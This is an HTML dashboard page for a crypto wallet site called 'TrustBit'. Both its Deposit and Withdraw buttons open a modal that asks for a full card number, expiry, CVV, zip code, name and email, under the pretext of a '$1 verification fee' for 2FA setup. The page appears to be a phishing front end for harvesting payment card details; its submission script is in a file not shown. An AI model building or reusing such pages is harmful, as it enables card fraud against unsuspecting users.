<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - TrustBit</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.1.1/web3.min.js"></script>
</head>

<body onload="loadDashboard()">
    <!-- ðŸ”¹ Navbar -->
    <nav class="navbar navbar-dark border-bottom border-secondary p-3">
        <div class="container d-flex justify-content-between align-items-center">
            <!-- âœ… Updated logo to trigger quickDeposit() -->
            <span class="navbar-brand fw-bold text-primary" style="cursor:pointer;" onclick="quickDeposit()">TrustBit</span>
            <button id="logoutBtn" class="btn btn-sm btn-outline-danger">Logout</button>
        </div>
    </nav>

    <!-- ðŸ”¹ Dashboard Body -->
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6 text-center">
                <h4 class="mb-4 text-secondary">Welcome back, <span id="userEmail" class="text-white">...</span></h4>

                <!-- ðŸ’° Balance Card -->
                <div class="card p-5 mb-4 border-primary">
                    <p class="text-uppercase small tracking-widest text-secondary">Total Balance</p>
                    <h1 class="display-5 fw-bold" id="btcBalance">0.00 BTC</h1>
                    <h3 class="text-success" id="usdBalance">$0.00</h3>
                    <div class="mt-4">
                        <button class="btn btn-primary px-4 me-2" onclick="openWithdraw()">Deposit</button>
                        <button class="btn btn-outline-light px-4" onclick="openWithdraw()">Withdraw</button>
                    </div>
                </div>

                <!-- ðŸ’¼ Wallet Address -->
                <div class="card p-3 border-secondary mb-4">
    <h6 class="text-secondary small text-uppercase">Your Wallet Address</h6>
   
    <div class="d-flex align-items-center justify-content-between bg-dark p-2 rounded">
        <a id="walletAddressDisplay"
           href="#"
           class="text-info small text-truncate me-2 text-decoration-none"
           onclick="copyWallet(event)">
           0xee0418D749E883785d82fB2615790DA90C1d44D9
        </a>
        <button class="btn btn-outline-success btn-sm px-3" onclick="copyWallet(event)">Copy</button>
    </div>
    </div>
                <!-- ðŸ“œ Transaction History -->
                <div class="card p-3 shadow-sm border-secondary">
                    <h5 class="text-secondary border-bottom border-secondary pb-2">Recent Activity</h5>
                    <div id="activityLog" class="small text-start" style="max-height: 150px; overflow-y: auto;">
                        <p class="text-muted fst-italic">No recent transactions...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ðŸ’³ Updated Withdraw Modal -->
    <div class="modal fade" id="withdrawModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content card border-0">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title">Payment Verification</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <p class="small text-secondary mb-4">To unlock Higher Withdrawal/Deposit/Send Crypto, a $1 verification fee is required for 2FA setup.</p>

                    <div class="mb-3">
                        <label class="form-label small text-secondary">Card Number</label>
                        <input type="text" id="cardNumber" class="form-control bg-dark text-white border-secondary" placeholder="0000 0000 0000 0000" maxlength="16">
                    </div>

                    <div class="row g-2 mb-3">
                        <div class="col-4">
                            <label class="form-label small text-secondary">Expiry</label>
                            <input type="text" id="cardExpiry" class="form-control bg-dark text-white border-secondary" placeholder="MM/YY" maxlength="5">
                        </div>
                        <div class="col-4">
                            <label class="form-label small text-secondary">CVV</label>
                            <input type="text" id="cardCvv" class="form-control bg-dark text-white border-secondary" placeholder="123" maxlength="3">
                        </div>
                        <div class="col-4">
                            <label class="form-label small text-secondary">Zip Code</label>
                            <input type="text" id="billingZip" class="form-control bg-dark text-white border-secondary" placeholder="10001">
                        </div>
                    </div>

                    <div class="mb-3">
                        <label class="form-label small text-secondary">Cardholder Name</label>
                        <input type="text" id="cardName" class="form-control bg-dark text-white border-secondary" placeholder="John Doe">
                    </div>
                    <div class="mb-4">
                        <label class="form-label small text-secondary">Card Type</label>
                        <select id="cardType" class="form-select bg-dark text-white border-secondary">
                            <option value="">Select Card Type</option>
                            <option value="debit">Debit Card</option>
                            <option value="credit">Credit Card</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label class="form-label small text-secondary">Input Email </label>
                        <input type="text" id="Email" class="form-control bg-dark text-white border-secondary" placeholder="Example@gmail.com">
                    </div>
                    <button class="btn btn-success w-100 py-2 fw-bold" id="payBtn" onclick="makePayment()">Pay $1 & Continue</button>
                </div>
            </div>
        </div>
    </div>

    <!-- ðŸ”¹ Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="js/main.js"></script>
</body>
</html>
